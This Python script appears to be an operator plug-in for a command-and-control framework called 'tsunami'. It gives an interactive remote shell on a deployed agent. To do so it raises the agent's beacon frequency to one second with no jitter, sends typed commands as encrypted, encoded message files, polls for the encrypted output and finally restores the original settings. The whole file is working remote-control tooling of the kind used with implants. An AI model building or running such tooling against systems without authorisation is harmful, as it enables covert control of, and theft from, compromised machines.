#!/usr/bin/env python3

MODULE_NAME = 'command_prompt'
RESPONSE_COMMAND_OUTPUT = "command_output"
COMMAND_FILE = 'interactive_command_prompt_request.json'
INTERACTIVE_COMMAND_PROMPT_KEY = "command_input"
GET_AGENT_SETTINGS_COMMAND_FILE = 'agent_get_settings_request.json'
SET_AGENT_SETTINGS_COMMAND_FILE = 'agent_set_settings_request.json'
AGENT_SETTINGS_SETTINGS_KEY = 'settings'
AGENT_SETTINGS_RESULT_KEY = 'result'
AGENT_SETTINGS_PERIODIC_MESSAGES_KEY = 'periodic_messages'
TRIGGER_SLEEP_COMMAND_FILE = 'trigger_sleep_request.json'
TRIGGER_SLEEP_SLEEP_SECONDS_KEY = 'sleep_seconds'
TRIGGER_SLEEP_VARIATION_SECONDS_KEY = 'variation_seconds'


# print('\n\n-----------------------------------------------------\n')
# print('__file__={0:<35}\n__name__={1:<20}\n__package__={2:<20}'.format(__file__,__name__,str(__package__)))
# print('\n-----------------------------------------------------\n')

import logging
import sys
import argparse
import os
import errno
import binascii
import random
import glob
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import tsunami



def parse_command_line():
    """Parse the command-line arguments"""
    # Create and add arguments to the parser
    parser = argparse.ArgumentParser(description=MODULE_NAME)
    parser.add_argument(dest="agent_dir", help="The agent's root directory")
    parser.add_argument("--debug", dest="debug", action='store_true', help="Display debug print statements")
    parser.set_defaults(debug=False)
    # Parse the arguments
    args = parser.parse_args()
    # Sanity check on arguments
    if not os.path.isdir(args.agent_dir):
        raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), args.agent_dir)
    return args


def get_agent_settings(binary_id_str, agent_id_str, agent_password, output_directory, upload_directory, script_directory, admin_directory ) -> dict:
    response_json = {}

    # Determine the secondary config file
    use_secondary_config_file = os.path.join(script_directory, "..", tsunami.COMMANDS_DIRECTORY, GET_AGENT_SETTINGS_COMMAND_FILE)
    secondary_module_name = os.path.splitext(os.path.basename(use_secondary_config_file))[0]
    if not os.path.isfile(use_secondary_config_file):
        raise FileNotFoundError(use_secondary_config_file)

    # Determine the primary config file
    use_primary_config_file = os.path.join(script_directory, "..", tsunami.COMMANDS_DIRECTORY, tsunami.BASELINE_CONFIG)
    primary_module_name = os.path.basename(os.path.dirname(use_primary_config_file))
    if not os.path.isfile(use_primary_config_file):
        raise FileNotFoundError(use_primary_config_file)

    # Load the secondary config file
    config_file_contents = ''
    with open(use_secondary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    secondary_options = json.loads(config_file_contents)

    # Load the primary config file
    config_file_contents = ''
    with open(use_primary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    primary_options = json.loads(config_file_contents)

    # Set the known, constant values
    primary_options[primary_module_name] = secondary_module_name
    primary_options[tsunami.MESSAGE_CONFIG_BINARY_ID] = int(binary_id_str)
    primary_options[tsunami.MESSAGE_CONFIG_AGENT_ID] = int(agent_id_str)

    # print("primary_options")
    # tsunami.print_json(primary_options, 2)
    # print("secondary_options")
    # tsunami.print_json(secondary_options, 2)

    os.chdir(admin_directory)
    required_count = 0
    optional_count = 0
    auto_count = 0
    random_count = 0

    # Determine the secondary_options_type
    if 'command' in primary_options.keys():
        secondary_options_type = primary_options['command']
    else:
        print('ERROR! Unknown secondary options type')
        return None

    # Set the command_input of the message
    new_secondary_options = secondary_options.copy()

    # Check the options for required values
    required_count, new_secondary_options = tsunami.check_required(new_secondary_options)
    if (required_count > 0):
        return None
    # Check the options for auto-incrementing values
    auto_count, new_secondary_options = tsunami.check_auto(new_secondary_options)
    # Check the options for random values
    random_count, new_secondary_options = tsunami.check_random(new_secondary_options)
    # Check the options for optional values
    random_count, new_secondary_options = tsunami.check_optional(new_secondary_options)

    # Set the secondary options bytes value in the primary options
    new_primary_options = primary_options.copy()
    new_secondary_options_string_encoded = tsunami.cJSON_CreateBytes(json.dumps(new_secondary_options).encode())
    new_primary_options.update({secondary_options_type: new_secondary_options_string_encoded})

    # Check the options for required values
    required_count, new_primary_options = tsunami.check_required(new_primary_options)
    if (required_count > 0):
        return None
    # Check the options for auto-incrementing values
    auto_count, new_primary_options = tsunami.check_auto(new_primary_options)
    # Check the options for random values
    random_count, new_primary_options = tsunami.check_random(new_primary_options)
    # Check the options for optional values
    random_count, new_primary_options = tsunami.check_optional(new_primary_options)
    message_options = new_primary_options
    os.chdir(script_directory)

    # print("message_options")
    # tsunami.print_json(message_options, 2)


    # Write the message to file
    input_buffer = json.dumps(message_options).encode()
    output_buffer = tsunami.CompressEncryptEncode(input_buffer, agent_password.encode())
    output_filename = '{:08x}{:s}'.format(message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID], tsunami.MESSAGE_EXTENSION)
    full_output_filename = os.path.join(output_directory, output_filename)
    with open(full_output_filename, 'wb') as outputfd:
        outputfd.write(output_buffer)
    sent_time = os.path.getmtime(full_output_filename)

    # print("full_output_filename: {:s}".format(full_output_filename))

    # Receive the response
    response_json = receive_response(agent_password, upload_directory,
                                     message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID], sent_time)

    return response_json


def set_agent_settings(binary_id_str, agent_id_str, agent_password, output_directory, upload_directory, script_directory, admin_directory, new_agent_settings ) -> dict:
    response_json = {}

    # Determine the secondary config file
    use_secondary_config_file = os.path.join(script_directory, "..", tsunami.COMMANDS_DIRECTORY, SET_AGENT_SETTINGS_COMMAND_FILE)
    secondary_module_name = os.path.splitext(os.path.basename(use_secondary_config_file))[0]
    if not os.path.isfile(use_secondary_config_file):
        raise FileNotFoundError(use_secondary_config_file)

    # Determine the primary config file
    use_primary_config_file = os.path.join(script_directory, "..", tsunami.COMMANDS_DIRECTORY, tsunami.BASELINE_CONFIG)
    primary_module_name = os.path.basename(os.path.dirname(use_primary_config_file))
    if not os.path.isfile(use_primary_config_file):
        raise FileNotFoundError(use_primary_config_file)

    # Load the secondary config file
    config_file_contents = ''
    with open(use_secondary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    secondary_options = json.loads(config_file_contents)

    # Load the primary config file
    config_file_contents = ''
    with open(use_primary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    primary_options = json.loads(config_file_contents)

    # Set the known, constant values
    primary_options[primary_module_name] = secondary_module_name
    primary_options[tsunami.MESSAGE_CONFIG_BINARY_ID] = int(binary_id_str)
    primary_options[tsunami.MESSAGE_CONFIG_AGENT_ID] = int(agent_id_str)

    # print("set_agent_settings::primary_options")
    # tsunami.print_json(primary_options, 2)
    # print("set_agent_settings::secondary_options")
    # tsunami.print_json(secondary_options, 2)

    os.chdir(admin_directory)
    required_count = 0
    optional_count = 0
    auto_count = 0
    random_count = 0

    # Determine the secondary_options_type
    if 'command' in primary_options.keys():
        secondary_options_type = primary_options['command']
    else:
        print('ERROR! Unknown secondary options type')
        return None

    # Set the command_input of the message
    new_secondary_options = secondary_options.copy()
    new_agent_settings_string = json.dumps(new_agent_settings)
    # print("new_agent_settings_string:\n----------\n{:s}\n--------------\n".format(new_agent_settings_string))
    new_secondary_options[AGENT_SETTINGS_SETTINGS_KEY] = new_agent_settings_string


    # Check the options for required values
    required_count, new_secondary_options = tsunami.check_required(new_secondary_options)
    if (required_count > 0):
        return None
    # Check the options for auto-incrementing values
    auto_count, new_secondary_options = tsunami.check_auto(new_secondary_options)
    # Check the options for random values
    random_count, new_secondary_options = tsunami.check_random(new_secondary_options)
    # Check the options for optional values
    random_count, new_secondary_options = tsunami.check_optional(new_secondary_options)

    # Set the secondary options bytes value in the primary options
    new_primary_options = primary_options.copy()
    new_secondary_options_string_encoded = tsunami.cJSON_CreateBytes(json.dumps(new_secondary_options).encode())
    new_primary_options.update({secondary_options_type: new_secondary_options_string_encoded})

    # Check the options for required values
    required_count, new_primary_options = tsunami.check_required(new_primary_options)
    if (required_count > 0):
        return None
    # Check the options for auto-incrementing values
    auto_count, new_primary_options = tsunami.check_auto(new_primary_options)
    # Check the options for random values
    random_count, new_primary_options = tsunami.check_random(new_primary_options)
    # Check the options for optional values
    random_count, new_primary_options = tsunami.check_optional(new_primary_options)
    message_options = new_primary_options
    os.chdir(script_directory)

    # print("set_agent_settings::message_options")
    # tsunami.print_json(message_options, 2)

    # Write the message to file
    input_buffer = json.dumps(message_options).encode()
    output_buffer = tsunami.CompressEncryptEncode(input_buffer, agent_password.encode())
    output_filename = '{:08x}{:s}'.format(message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID], tsunami.MESSAGE_EXTENSION)
    full_output_filename = os.path.join(output_directory, output_filename)
    with open(full_output_filename, 'wb') as outputfd:
        outputfd.write(output_buffer)
    sent_time = os.path.getmtime(full_output_filename)

    # print("full_output_filename: {:s}".format(full_output_filename))

    # Receive the response
    response_json = receive_response(agent_password, upload_directory,
                                     message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID], sent_time)

    return response_json


def create_periodic_messages(binary_id_str, agent_id_str, agent_password, output_directory, upload_directory, script_directory, admin_directory ) -> dict:
    periodic_messages = list()

    # Determine the secondary config file
    use_secondary_config_file = os.path.join(script_directory, "..", tsunami.COMMANDS_DIRECTORY, TRIGGER_SLEEP_COMMAND_FILE)
    secondary_module_name = os.path.splitext(os.path.basename(use_secondary_config_file))[0]
    if not os.path.isfile(use_secondary_config_file):
        raise FileNotFoundError(use_secondary_config_file)

    # Determine the primary config file
    use_primary_config_file = os.path.join(script_directory, "..", tsunami.COMMANDS_DIRECTORY, tsunami.BASELINE_CONFIG)
    primary_module_name = os.path.basename(os.path.dirname(use_primary_config_file))
    if not os.path.isfile(use_primary_config_file):
        raise FileNotFoundError(use_primary_config_file)

    # Load the secondary config file
    config_file_contents = ''
    with open(use_secondary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    secondary_options = json.loads(config_file_contents)

    # Load the primary config file
    config_file_contents = ''
    with open(use_primary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    primary_options = json.loads(config_file_contents)

    # Set the known, constant values
    primary_options[primary_module_name] = secondary_module_name
    primary_options.pop(tsunami.MESSAGE_CONFIG_BINARY_ID)
    primary_options.pop(tsunami.MESSAGE_CONFIG_AGENT_ID)
    primary_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID] = 0

    secondary_options[TRIGGER_SLEEP_SLEEP_SECONDS_KEY] = 1
    secondary_options[TRIGGER_SLEEP_VARIATION_SECONDS_KEY] = 0

    # print("primary_options")
    # tsunami.print_json(primary_options, 2)
    # print("secondary_options")
    # tsunami.print_json(secondary_options, 2)

    # Set the secondary options bytes value in the primary options
    secondary_options_string_encoded = tsunami.cJSON_CreateBytes(json.dumps(secondary_options).encode())
    primary_options.update({secondary_module_name: secondary_options_string_encoded})

    # print("primary_options")
    # tsunami.print_json(primary_options, 2)

    periodic_messages.append(primary_options)
    # print("periodic_messages")
    # tsunami.print_json(periodic_messages, 2)


    return periodic_messages

def create_interactive_command_message(primary_options, secondary_options, cmd_message) -> dict:
    required_count = 0
    optional_count = 0
    auto_count = 0
    random_count = 0

    # Determine the secondary_options_type
    if 'command' in primary_options.keys():
        secondary_options_type = primary_options['command']
    else:
        print('ERROR! Unknown secondary options type')
        return None

    # Set the command_input of the message
    new_secondary_options = secondary_options.copy()
    new_secondary_options[INTERACTIVE_COMMAND_PROMPT_KEY] = cmd_message

    # Check the options for required values
    required_count, new_secondary_options = tsunami.check_required(new_secondary_options)
    if (required_count > 0):
        return None
    # Check the options for auto-incrementing values
    auto_count, new_secondary_options = tsunami.check_auto(new_secondary_options)
    # Check the options for random values
    random_count, new_secondary_options = tsunami.check_random(new_secondary_options)
    # Check the options for optional values
    random_count, new_secondary_options = tsunami.check_optional(new_secondary_options)

    # Set the secondary options bytes value in the primary options
    new_primary_options = primary_options.copy()
    new_secondary_options_string_encoded = tsunami.cJSON_CreateBytes(json.dumps(new_secondary_options).encode())
    new_primary_options.update({secondary_options_type: new_secondary_options_string_encoded})

    # Check the options for required values
    required_count, new_primary_options = tsunami.check_required(new_primary_options)
    if (required_count > 0):
        return None
    # Check the options for auto-incrementing values
    auto_count, new_primary_options = tsunami.check_auto(new_primary_options)
    # Check the options for random values
    random_count, new_primary_options = tsunami.check_random(new_primary_options)
    # Check the options for optional values
    random_count, new_primary_options = tsunami.check_optional(new_primary_options)

    return new_primary_options

def receive_response(agent_password, uploads_dir, message_id, sent_time) -> dict:
    check_time = sent_time
    while True:
        for file in os.listdir(uploads_dir):
            full_path = os.path.join(uploads_dir, file)
            if os.path.isfile(full_path):
                if file.endswith(".bin"):
                    if (os.path.getmtime(full_path) > check_time):
                        received_message_encoded = ""
                        with open(full_path, "rb") as input_fd:
                            received_message_encoded = input_fd.read()
                        received_message_decoded = tsunami.DecodeDecryptDecompress(received_message_encoded, agent_password.encode())
                        received_main_options = json.loads(received_message_decoded)

                        message_list = list()
                        if not isinstance(received_main_options, list):
                            message_list = [received_main_options]
                        else:
                            message_list = received_main_options
                        for message_json in message_list:
                            if message_json[tsunami.MESSAGE_CONFIG_MESSAGE_ID] == message_id:
                                response_bytes =  tsunami.cJSON_GetBytesValue(message_json[tsunami.MESSAGE_CONFIG_RESPONSE])
                                response_json = json.loads(response_bytes)
                                return response_json
        time.sleep(1)
    return None



def main(args):
    """interactive_command_prompt server plug-in"""

    agent_path_list = args.agent_dir.split(os.path.sep)
    binary_id_str = agent_path_list[-2]
    agent_id_str = agent_path_list[-1]
    agent_password = tsunami.get_agent_password_from_agent_path(args.agent_dir)
    output_directory = os.path.join(args.agent_dir, tsunami.DOWNLOADS_DIRECTORY)
    upload_directory = os.path.join(args.agent_dir, tsunami.UPLOADS_DIRECTORY)
    script_directory = os.path.dirname(__file__)
    admin_directory = os.path.join(args.agent_dir, tsunami.ADMIN_DIRECTORY)

    # Determine the secondary config file
    use_secondary_config_file = os.path.join(script_directory,"..",tsunami.COMMANDS_DIRECTORY,COMMAND_FILE)
    secondary_module_name = os.path.splitext(os.path.basename(use_secondary_config_file))[0]
    if not os.path.isfile(use_secondary_config_file):
        raise FileNotFoundError(use_secondary_config_file)

    # Determine the primary config file
    use_primary_config_file = os.path.join(script_directory,"..",tsunami.COMMANDS_DIRECTORY, tsunami.BASELINE_CONFIG)
    primary_module_name = os.path.basename(os.path.dirname(use_primary_config_file))
    if not os.path.isfile(use_primary_config_file):
        raise FileNotFoundError(use_primary_config_file)

    # Load the secondary config file
    config_file_contents = ''
    with open(use_secondary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    secondary_options = json.loads(config_file_contents)

    # Load the primary config file
    config_file_contents = ''
    with open(use_primary_config_file, "r") as input_fd:
        config_file_contents = input_fd.read()
    primary_options = json.loads(config_file_contents)

    # Set the known, constant values
    primary_options[primary_module_name] = secondary_module_name
    primary_options[tsunami.MESSAGE_CONFIG_BINARY_ID] = int(binary_id_str)
    primary_options[tsunami.MESSAGE_CONFIG_AGENT_ID] = int(agent_id_str)


    # Get the initial agent settings
    print("Getting the original agent settings...")
    get_agent_settings_response = get_agent_settings(binary_id_str, agent_id_str, agent_password, output_directory, upload_directory, script_directory, admin_directory)
    # print("get_agent_settings_response")
    # tsunami.print_json(get_agent_settings_response, 2)
    original_agent_settings_string = get_agent_settings_response[AGENT_SETTINGS_SETTINGS_KEY]
    # print("original_agent_settings_string:\n-------\n{:s}\n-------\n".format(original_agent_settings_string))
    original_agent_settings = json.loads(original_agent_settings_string)
    # print("original_agent_settings")
    # tsunami.print_json(original_agent_settings, 2)
    new_agent_settings = original_agent_settings.copy()
    new_periodic_messages = create_periodic_messages(binary_id_str, agent_id_str, agent_password, output_directory, upload_directory, script_directory, admin_directory)
    # print("new_periodic_messages")
    # tsunami.print_json(new_periodic_messages, 2)
    new_agent_settings[AGENT_SETTINGS_PERIODIC_MESSAGES_KEY] = new_periodic_messages
    print("Updating the callback frequency of agent to go interactive...")
    set_agent_settings_response = set_agent_settings(binary_id_str, agent_id_str, agent_password, output_directory, upload_directory, script_directory, admin_directory, new_agent_settings)
    # print("set_agent_settings_response")
    # tsunami.print_json(set_agent_settings_response, 2)

    # First, get the current directory from the agent
    cmd_input = "cd"

    # Create the message
    if primary_module_name == "command":
        # Change to the Admin directory before running the create_interactive_command_message
        os.chdir(admin_directory)
    message_options = create_interactive_command_message(primary_options, secondary_options, cmd_input)
    os.chdir(script_directory)

    # Write the message to file
    input_buffer = json.dumps(message_options).encode()
    output_buffer = tsunami.CompressEncryptEncode(input_buffer, agent_password.encode())
    output_filename = '{:08x}{:s}'.format(message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID],tsunami.MESSAGE_EXTENSION)
    full_output_filename = os.path.join(output_directory, output_filename)
    with open(full_output_filename, 'wb') as outputfd:
        outputfd.write(output_buffer)
    sent_time = os.path.getmtime(full_output_filename)

    # Receive the response
    response_json =  receive_response(agent_password, upload_directory, message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID], sent_time)
    command_output = response_json[RESPONSE_COMMAND_OUTPUT]
    command_output = command_output[command_output.find("\r\n")+2:]

    # Now loop prompting for the commands to send and displaying the response
    while True:
        cmd_input = input(command_output)

        if cmd_input == 'exit':
            set_agent_settings_response = set_agent_settings(binary_id_str, agent_id_str, agent_password,
                                                             output_directory, upload_directory, script_directory,
                                                             admin_directory, original_agent_settings)
            reset_agent_settings_response = "False"
            if set_agent_settings_response[AGENT_SETTINGS_RESULT_KEY]:
                reset_agent_settings_response = "True"
            # print("Reset agent settings: {:s}".format(reset_agent_settings_response))
            #tsunami.print_json(set_agent_settings_response, 2)
            break # Don't actually send exit

        # Create the message
        if primary_module_name == "command":
            # Change to the Admin directory before running the create_interactive_command_message
            os.chdir(admin_directory)
        message_options = create_interactive_command_message(primary_options, secondary_options, cmd_input)
        os.chdir(script_directory)

        # Write the message to file
        input_buffer = json.dumps(message_options).encode()
        output_buffer = tsunami.CompressEncryptEncode(input_buffer, agent_password.encode())
        output_filename = '{:08x}{:s}'.format(message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID],
                                              tsunami.MESSAGE_EXTENSION)
        full_output_filename = os.path.join(output_directory, output_filename)
        with open(full_output_filename, 'wb') as outputfd:
            outputfd.write(output_buffer)

        # Receive the response
        response_json = receive_response(agent_password, upload_directory,
                                         message_options[tsunami.MESSAGE_CONFIG_MESSAGE_ID], sent_time)
        command_output = response_json[RESPONSE_COMMAND_OUTPUT]
        command_output = command_output[command_output.find("\n") + 1:]


    return


if __name__ == "__main__":
    args = parse_command_line()
    sys.exit(main(args))
